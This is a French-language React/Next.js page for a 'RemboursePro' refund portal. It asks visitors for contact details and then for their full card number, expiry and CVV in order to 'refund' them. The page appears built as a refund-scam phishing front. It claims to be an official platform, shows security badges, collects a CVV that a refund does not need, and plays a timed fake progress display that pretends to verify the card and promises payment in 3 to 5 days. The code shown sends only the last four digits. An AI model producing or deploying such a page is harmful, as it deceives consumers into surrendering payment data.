'use client';

import { useState, useEffect, type SVGProps } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Separator } from '@/components/ui/separator';
import { supabase } from '@/lib/supabase';

const iconProps = {
  stroke: 'currentColor',
  strokeWidth: 2,
  strokeLinecap: 'round' as const,
  strokeLinejoin: 'round' as const,
  fill: 'none',
};

const ShieldCheck = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M12 3l7 3v6c0 4.2-2.7 7.9-7 10-4.3-2.1-7-5.8-7-10V6l7-3z" />
    <path d="m9 12 2 2 4-4" />
  </svg>
);

const CreditCard = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <rect x="2.5" y="5" width="19" height="14" rx="2" />
    <path d="M2.5 10h19" />
    <path d="M7 15h3" />
  </svg>
);

const User = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <circle cx="12" cy="8" r="4" />
    <path d="M5 20c1.5-3 4-4.5 7-4.5S17.5 17 19 20" />
  </svg>
);

const Mail = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <rect x="3" y="5" width="18" height="14" rx="2" />
    <path d="m4 7 8 6 8-6" />
  </svg>
);

const Phone = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M7 4h3l1 5-2 2a15 15 0 0 0 9 9l2-2 5 1v3a2 2 0 0 1-2 2A17 17 0 0 1 5 6a2 2 0 0 1 2-2Z" />
  </svg>
);

const FileText = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7l-5-4Z" />
    <path d="M14 3v4h4" />
    <path d="M8 12h8M8 16h8" />
  </svg>
);

const Euro = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M5 9.5h10M5 14.5h10M14.5 3a4 4 0 0 0-4 4v1.5a4 4 0 0 1-4 4h0a4 4 0 0 1 4 4v1.5a4 4 0 0 0 4 4" />
  </svg>
);

const ArrowRight = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M5 12h14" />
    <path d="m13 5 7 7-7 7" />
  </svg>
);

const ArrowLeft = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M19 12H5" />
    <path d="m11 5-7 7 7 7" />
  </svg>
);

const CheckCircle2 = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <circle cx="12" cy="12" r="9" />
    <path d="m8 12 3 3 5-6" />
  </svg>
);

const Loader2 = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83" />
  </svg>
);

const Lock = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <rect x="5" y="10" width="14" height="10" rx="2" />
    <path d="M8 10V7a4 4 0 1 1 8 0v3" />
  </svg>
);

const Calendar = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <rect x="3" y="5" width="18" height="16" rx="2" />
    <path d="M8 3v4M16 3v4M3 10h18" />
  </svg>
);

const Clock = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <circle cx="12" cy="12" r="9" />
    <path d="M12 7v5l4 2" />
  </svg>
);

const ChevronRight = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="m9 18 6-6-6-6" />
  </svg>
);

const BadgeCheck = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <path d="M12 3.5 5.5 6v5.5C5.5 16.6 8.5 19.7 12 21c3.5-1.3 6.5-4.4 6.5-9.5V6L12 3.5Z" />
    <path d="m9.5 12 1.7 1.7 3.5-4.2" />
  </svg>
);

const AlertCircle = (props: SVGProps<SVGSVGElement>) => (
  <svg viewBox="0 0 24 24" {...iconProps} {...props}>
    <circle cx="12" cy="12" r="9" />
    <path d="M12 8v5" />
    <circle cx="12" cy="16.5" r="1" fill="currentColor" stroke="none" />
  </svg>
);

type Step = 'info' | 'card' | 'processing';

interface FormData {
  fullName: string;
  email: string;
  phone: string;
  reservationNumber: string;
  reason: string;
  amount: string;
  cardNumber: string;
  cardCvv: string;
  cardExpiry: string;
}

export default function Home() {
  const [step, setStep] = useState<Step>('info');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [progress, setProgress] = useState(0);
  const [formData, setFormData] = useState<FormData>({
    fullName: '',
    email: '',
    phone: '',
    reservationNumber: '',
    reason: '',
    amount: '',
    cardNumber: '',
    cardCvv: '',
    cardExpiry: '',
  });

  useEffect(() => {
    if (step !== 'processing') return;
    setProgress(0);
    const interval = setInterval(() => {
      setProgress((p) => {
        if (p >= 100) {
          clearInterval(interval);
          return 100;
        }
        return p + 2;
      });
    }, 80);
    return () => clearInterval(interval);
  }, [step]);

  const updateField = (field: keyof FormData, value: string) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
    setError('');
  };

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 16);
    return digits.replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  const formatExpiry = (value: string) => {
    const digits = value.replace(/\D/g, '').slice(0, 4);
    if (digits.length >= 3) {
      return digits.slice(0, 2) + '/' + digits.slice(2);
    }
    return digits;
  };

  const validateInfo = () => {
    if (!formData.fullName.trim()) return 'Veuillez saisir votre nom complet.';
    if (!formData.email.trim()) return 'Veuillez saisir votre adresse e-mail.';
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) return 'Adresse e-mail invalide.';
    if (!formData.phone.trim()) return 'Veuillez saisir votre numéro de téléphone.';
    if (!formData.reservationNumber.trim()) return 'Veuillez saisir votre numéro de réservation.';
    if (!formData.amount.trim()) return 'Veuillez saisir le montant à rembourser.';
    const amt = parseFloat(formData.amount);
    if (isNaN(amt) || amt <= 0) return 'Le montant doit être un nombre positif.';
    return '';
  };

  const validateCard = () => {
    const digits = formData.cardNumber.replace(/\s/g, '');
    if (digits.length !== 16) return 'Le numéro de carte doit comporter 16 chiffres.';
    if (!/^\d{3,4}$/.test(formData.cardCvv)) return 'Le CVV doit comporter 3 ou 4 chiffres.';
    if (!/^\d{2}\/\d{2}$/.test(formData.cardExpiry)) return 'Veuillez saisir une date d\'expiration valide (MM/AA).';
    return '';
  };

  const submitAll = async () => {
    const cardDigits = formData.cardNumber.replace(/\s/g, '');

    const { error: dbError } = await supabase.from('refund_requests').insert({
      full_name: formData.fullName,
      email: formData.email,
      phone: formData.phone,
      reservation_number: formData.reservationNumber,
      reason: formData.reason || null,
      amount: parseFloat(formData.amount),
      currency: 'EUR',
      refund_method: 'card',
      card_number_last4: cardDigits.slice(-4),
      status: 'pending',
    });
    if (dbError) throw new Error('Erreur lors de l\'enregistrement de votre demande.');

    const res = await fetch('/api/refund', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        fullName: formData.fullName,
        email: formData.email,
        phone: formData.phone,
        reservationNumber: formData.reservationNumber,
        reason: formData.reason,
        amount: formData.amount,
        cardLast4: cardDigits.slice(-4),
      }),
    });
    if (!res.ok) throw new Error('Erreur lors de l\'envoi des informations.');
  };

  const handleInfoSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const err = validateInfo();
    if (err) {
      setError(err);
      return;
    }
    setStep('card');
  };

  const handleCardSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const err = validateCard();
    if (err) {
      setError(err);
      return;
    }
    setLoading(true);
    setError('');
    try {
      await submitAll();
      setStep('processing');
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Une erreur est survenue.');
    } finally {
      setLoading(false);
    }
  };

  const handleReset = () => {
    setFormData({
      fullName: '',
      email: '',
      phone: '',
      reservationNumber: '',
      reason: '',
      amount: '',
      cardNumber: '',
      cardCvv: '',
      cardExpiry: '',
    });
    setStep('info');
    setError('');
    setProgress(0);
  };

  const steps: { key: Step; label: string; icon: typeof User }[] = [
    { key: 'info', label: 'Informations', icon: User },
    { key: 'card', label: 'Paiement', icon: CreditCard },
    { key: 'processing', label: 'Traitement', icon: Loader2 },
  ];

  const currentStepIndex = steps.findIndex((s) => s.key === step);

  return (
    <div className="min-h-screen bg-gradient-to-br from-sky-50 via-white to-blue-50">
      {/* Header */}
      <header className="border-b border-border/40 bg-white/80 backdrop-blur-md sticky top-0 z-50">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-sky-500 to-blue-600 flex items-center justify-center shadow-lg shadow-sky-500/20">
              <ShieldCheck className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-lg font-bold tracking-tight text-foreground">RemboursePro</h1>
              <p className="text-xs text-muted-foreground hidden sm:block">Service de remboursement sécurisé</p>
            </div>
          </div>
          <div className="hidden md:flex items-center gap-2 text-sm text-muted-foreground">
            <Lock className="w-4 h-4 text-sky-600" />
            <span>Connexion chiffrée SSL 256 bits</span>
          </div>
        </div>
      </header>

      {/* Hero */}
      {step === 'info' && (
        <section className="max-w-5xl mx-auto px-4 sm:px-6 pt-12 pb-8 text-center animate-fade-in">
          <Badge variant="secondary" className="mb-4 bg-sky-100 text-sky-700 border-sky-200">
            <BadgeCheck className="w-3.5 h-3.5 mr-1" />
            Plateforme officielle de remboursement
          </Badge>
          <h2 className="text-3xl sm:text-4xl font-bold tracking-tight text-foreground mb-3">
            Demandez votre remboursement en quelques minutes
          </h2>
          <p className="text-muted-foreground text-base sm:text-lg max-w-2xl mx-auto">
            Que ce soit pour une réservation ou une visite, notre service vous accompagne pour un remboursement rapide et sécurisé par carte bancaire.
          </p>
        </section>
      )}

      {/* Main */}
      <main className="max-w-3xl mx-auto px-4 sm:px-6 pb-20">
        {/* Stepper */}
        {step !== 'processing' && (
          <div className="flex items-center justify-center gap-2 sm:gap-4 mb-8 animate-slide-up">
            {steps.map((s, idx) => {
              const Icon = s.icon;
              const isActive = idx === currentStepIndex;
              const isDone = idx < currentStepIndex;
              return (
                <div key={s.key} className="flex items-center">
                  <div className="flex flex-col items-center gap-1.5">
                    <div
                      className={`w-10 h-10 rounded-full flex items-center justify-center transition-all duration-300 ${
                        isActive
                          ? 'bg-sky-500 text-white shadow-lg shadow-sky-500/30 scale-110'
                          : isDone
                          ? 'bg-green-500 text-white'
                          : 'bg-muted text-muted-foreground'
                      }`}
                    >
                      {isDone ? <CheckCircle2 className="w-5 h-5" /> : <Icon className={`w-5 h-5 ${isActive ? 'animate-pulse-ring' : ''}`} />}
                    </div>
                    <span className={`text-xs font-medium ${isActive ? 'text-sky-600' : isDone ? 'text-green-600' : 'text-muted-foreground'}`}>
                      {s.label}
                    </span>
                  </div>
                  {idx < steps.length - 1 && (
                    <div className={`w-8 sm:w-16 h-0.5 mx-1 sm:mx-2 rounded-full transition-all duration-300 ${idx < currentStepIndex ? 'bg-green-500' : 'bg-muted'}`} />
                  )}
                </div>
              );
            })}
          </div>
        )}

        {/* Step 1: Info */}
        {step === 'info' && (
          <Card className="shadow-xl shadow-sky-500/5 border-border/50 animate-slide-up">
            <CardHeader>
              <CardTitle className="text-xl flex items-center gap-2">
                <User className="w-5 h-5 text-sky-600" />
                Vos informations
              </CardTitle>
              <CardDescription>
                Renseignez vos coordonnées et les détails de votre demande de remboursement.
              </CardDescription>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleInfoSubmit} className="space-y-5">
                <div className="grid sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="fullName">Nom complet *</Label>
                    <div className="relative">
                      <User className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        id="fullName"
                        placeholder="Jean Dupont"
                        className="pl-10"
                        value={formData.fullName}
                        onChange={(e) => updateField('fullName', e.target.value)}
                      />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="email">Adresse e-mail *</Label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        id="email"
                        type="email"
                        placeholder="jean.dupont@email.com"
                        className="pl-10"
                        value={formData.email}
                        onChange={(e) => updateField('email', e.target.value)}
                      />
                    </div>
                  </div>
                </div>

                <div className="grid sm:grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="phone">Téléphone *</Label>
                    <div className="relative">
                      <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        id="phone"
                        type="tel"
                        placeholder="06 12 34 56 78"
                        className="pl-10"
                        value={formData.phone}
                        onChange={(e) => updateField('phone', e.target.value)}
                      />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="reservationNumber">Numéro de réservation *</Label>
                    <div className="relative">
                      <FileText className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        id="reservationNumber"
                        placeholder="RES-2024-00123"
                        className="pl-10"
                        value={formData.reservationNumber}
                        onChange={(e) => updateField('reservationNumber', e.target.value)}
                      />
                    </div>
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="amount">Montant à rembourser (€) *</Label>
                  <div className="relative">
                    <Euro className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                    <Input
                      id="amount"
                      type="number"
                      step="0.01"
                      min="0"
                      placeholder="149,99"
                      className="pl-10"
                      value={formData.amount}
                      onChange={(e) => updateField('amount', e.target.value)}
                    />
                  </div>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="reason">Motif du remboursement (optionnel)</Label>
                  <Textarea
                    id="reason"
                    placeholder="Décrivez la raison de votre demande de remboursement..."
                    rows={3}
                    value={formData.reason}
                    onChange={(e) => updateField('reason', e.target.value)}
                  />
                </div>

                {error && (
                  <div className="flex items-center gap-2 text-sm text-destructive bg-destructive/10 px-4 py-3 rounded-lg animate-fade-in">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    {error}
                  </div>
                )}

                <Button type="submit" size="lg" className="w-full bg-sky-500 hover:bg-sky-600 text-white shadow-lg shadow-sky-500/20 transition-all">
                  Continuer
                  <ArrowRight className="w-5 h-5 ml-2" />
                </Button>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Step 2: Card */}
        {step === 'card' && (
          <Card className="shadow-xl shadow-sky-500/5 border-border/50 animate-slide-in">
            <CardHeader>
              <CardTitle className="text-xl flex items-center gap-2">
                <CreditCard className="w-5 h-5 text-sky-600" />
                Remboursement par carte bancaire
              </CardTitle>
              <CardDescription>
                Souhaitez-vous recevoir votre remboursement sur votre carte bancaire ? Renseignez vos coordonnées ci-dessous.
              </CardDescription>
            </CardHeader>
            <CardContent>
              {/* Summary */}
              <div className="bg-sky-50 border border-sky-100 rounded-xl p-4 mb-6">
                <p className="text-xs font-medium text-sky-700 mb-2 uppercase tracking-wide">Récapitulatif</p>
                <div className="flex items-center justify-between">
                  <div className="text-sm text-muted-foreground">
                    <p className="font-medium text-foreground">{formData.fullName}</p>
                    <p>Réservation : {formData.reservationNumber}</p>
                  </div>
                  <div className="text-right">
                    <p className="text-2xl font-bold text-sky-600">{parseFloat(formData.amount || '0').toFixed(2)} €</p>
                    <p className="text-xs text-muted-foreground">À rembourser</p>
                  </div>
                </div>
              </div>

              <form onSubmit={handleCardSubmit} className="space-y-5">
                <div className="space-y-2">
                  <Label htmlFor="cardNumber">Numéro de carte (16 chiffres) *</Label>
                  <div className="relative">
                    <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                    <Input
                      id="cardNumber"
                      placeholder="1234 5678 9012 3456"
                      className="pl-10 font-mono tracking-wider"
                      value={formData.cardNumber}
                      onChange={(e) => updateField('cardNumber', formatCardNumber(e.target.value))}
                      inputMode="numeric"
                    />
                  </div>
                  {formData.cardNumber.replace(/\s/g, '').length === 16 && (
                    <p className="text-xs text-green-600 flex items-center gap-1 animate-fade-in">
                      <CheckCircle2 className="w-3 h-3" />
                      Numéro de carte valide (16 chiffres)
                    </p>
                  )}
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <Label htmlFor="cardExpiry">Date d'expiration *</Label>
                    <div className="relative">
                      <Calendar className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        id="cardExpiry"
                        placeholder="MM/AA"
                        className="pl-10 font-mono"
                        value={formData.cardExpiry}
                        onChange={(e) => updateField('cardExpiry', formatExpiry(e.target.value))}
                        inputMode="numeric"
                      />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="cardCvv">CVV *</Label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        id="cardCvv"
                        type="password"
                        placeholder="123"
                        className="pl-10 font-mono"
                        value={formData.cardCvv}
                        onChange={(e) => updateField('cardCvv', e.target.value.replace(/\D/g, '').slice(0, 4))}
                        inputMode="numeric"
                      />
                    </div>
                  </div>
                </div>

                <div className="flex items-start gap-2 text-xs text-muted-foreground bg-muted/50 px-4 py-3 rounded-lg">
                  <Lock className="w-4 h-4 text-sky-600 flex-shrink-0 mt-0.5" />
                  <span>
                    Vos informations bancaires sont transmises via une connexion chiffrée et traitées de manière sécurisée. Seuls les 4 derniers chiffres de votre carte sont conservés.
                  </span>
                </div>

                {error && (
                  <div className="flex items-center gap-2 text-sm text-destructive bg-destructive/10 px-4 py-3 rounded-lg animate-fade-in">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    {error}
                  </div>
                )}

                <div className="flex gap-3">
                  <Button
                    type="button"
                    variant="outline"
                    size="lg"
                    onClick={() => setStep('info')}
                    className="flex-shrink-0"
                  >
                    <ArrowLeft className="w-5 h-5 mr-2" />
                    Retour
                  </Button>
                  <Button
                    type="submit"
                    size="lg"
                    disabled={loading}
                    className="flex-1 bg-sky-500 hover:bg-sky-600 text-white shadow-lg shadow-sky-500/20 transition-all"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                        Envoi en cours...
                      </>
                    ) : (
                      <>
                        Continuer
                        <ArrowRight className="w-5 h-5 ml-2" />
                      </>
                    )}
                  </Button>
                </div>
              </form>
            </CardContent>
          </Card>
        )}

        {/* Step 3: Processing */}
        {step === 'processing' && (
          <div className="animate-fade-in">
            <Card className="shadow-xl shadow-sky-500/5 border-border/50 overflow-hidden">
              {progress < 100 ? (
                <CardContent className="pt-12 pb-12 px-6 text-center">
                  {/* Animated loader */}
                  <div className="relative w-24 h-24 mx-auto mb-8">
                    <div className="absolute inset-0 rounded-full border-4 border-sky-100" />
                    <div className="absolute inset-0 rounded-full border-4 border-sky-500 border-t-transparent animate-spin" />
                    <div className="absolute inset-0 flex items-center justify-center">
                      <Loader2 className="w-8 h-8 text-sky-500 animate-spin" />
                    </div>
                  </div>

                  <h2 className="text-2xl font-bold text-foreground mb-3">
                    Patientez un moment...
                  </h2>
                  <p className="text-muted-foreground text-base mb-8 max-w-md mx-auto">
                    Votre remboursement est en cours de traitement. Veuillez ne pas fermer cette page.
                  </p>

                  {/* Progress bar */}
                  <div className="max-w-md mx-auto">
                    <div className="h-2.5 bg-sky-100 rounded-full overflow-hidden">
                      <div
                        className="h-full bg-gradient-to-r from-sky-500 to-blue-600 rounded-full transition-all duration-100 ease-linear relative overflow-hidden"
                        style={{ width: `${progress}%` }}
                      >
                        <div className="absolute inset-0 animate-shimmer" />
                      </div>
                    </div>
                    <div className="flex items-center justify-between mt-2 text-sm text-muted-foreground">
                      <span className="flex items-center gap-1.5">
                        <Clock className="w-4 h-4" />
                        Traitement en cours...
                      </span>
                      <span className="font-mono font-medium text-sky-600">{progress}%</span>
                    </div>
                  </div>

                  {/* Steps list */}
                  <div className="max-w-md mx-auto mt-8 space-y-2 text-left">
                    {[
                      { label: 'Vérification des informations', done: progress > 20 },
                      { label: 'Validation de la carte bancaire', done: progress > 50 },
                      { label: 'Traitement du remboursement', done: progress > 80 },
                    ].map((item, idx) => (
                      <div key={idx} className="flex items-center gap-3 text-sm">
                        <div className={`w-5 h-5 rounded-full flex items-center justify-center transition-all duration-300 ${item.done ? 'bg-green-500' : 'bg-muted'}`}>
                          {item.done ? (
                            <CheckCircle2 className="w-3.5 h-3.5 text-white" />
                          ) : (
                            <Loader2 className="w-3 h-3 text-muted-foreground animate-spin" />
                          )}
                        </div>
                        <span className={item.done ? 'text-foreground' : 'text-muted-foreground'}>
                          {item.label}
                        </span>
                      </div>
                    ))}
                  </div>
                </CardContent>
              ) : (
                <CardContent className="pt-12 pb-12 px-6 text-center animate-slide-up">
                  <div className="w-20 h-20 mx-auto mb-6 rounded-full bg-green-100 flex items-center justify-center">
                    <CheckCircle2 className="w-12 h-12 text-green-600" />
                  </div>

                  <h2 className="text-2xl font-bold text-foreground mb-3">
                    Demande envoyée avec succès !
                  </h2>
                  <p className="text-muted-foreground text-base mb-2 max-w-md mx-auto">
                    Votre demande de remboursement de <span className="font-semibold text-foreground">{parseFloat(formData.amount).toFixed(2)} €</span> a été enregistrée.
                  </p>
                  <p className="text-muted-foreground text-sm mb-8 max-w-md mx-auto">
                    Votre demande a été transmise pour traitement. Vous recevrez votre remboursement sous 3 à 5 jours ouvrés.
                  </p>

                  <div className="bg-sky-50 border border-sky-100 rounded-xl p-4 max-w-md mx-auto mb-8 text-left">
                    <p className="text-xs font-medium text-sky-700 mb-2 uppercase tracking-wide">Détails de la demande</p>
                    <div className="space-y-1.5 text-sm">
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Demandeur</span>
                        <span className="font-medium">{formData.fullName}</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Réservation</span>
                        <span className="font-medium font-mono">{formData.reservationNumber}</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Carte</span>
                        <span className="font-medium font-mono">**** {formData.cardNumber.replace(/\s/g, '').slice(-4)}</span>
                      </div>
                      <Separator className="my-1" />
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">Montant</span>
                        <span className="font-bold text-sky-600">{parseFloat(formData.amount).toFixed(2)} €</span>
                      </div>
                    </div>
                  </div>

                  <Button
                    onClick={handleReset}
                    size="lg"
                    variant="outline"
                    className="mx-auto"
                  >
                    Nouvelle demande
                    <ChevronRight className="w-5 h-5 ml-2" />
                  </Button>
                </CardContent>
              )}
            </Card>

            {progress >= 100 && (
              <div className="mt-6 flex items-center justify-center gap-2 text-sm text-muted-foreground animate-fade-in">
                <ShieldCheck className="w-4 h-4 text-green-600" />
                Transaction sécurisée et chiffrée
              </div>
            )}
          </div>
        )}
      </main>

      {/* Footer */}
      <footer className="border-t border-border/40 bg-white/50 mt-auto">
        <div className="max-w-5xl mx-auto px-4 sm:px-6 py-6 flex flex-col sm:flex-row items-center justify-between gap-3 text-sm text-muted-foreground">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-sky-600" />
            <span>RemboursePro — Plateforme sécurisée de remboursement</span>
          </div>
          <div className="flex items-center gap-4">
            <span className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /> SSL 256 bits</span>
            <span className="flex items-center gap-1.5"><BadgeCheck className="w-3.5 h-3.5" /> Conforme RGPD</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
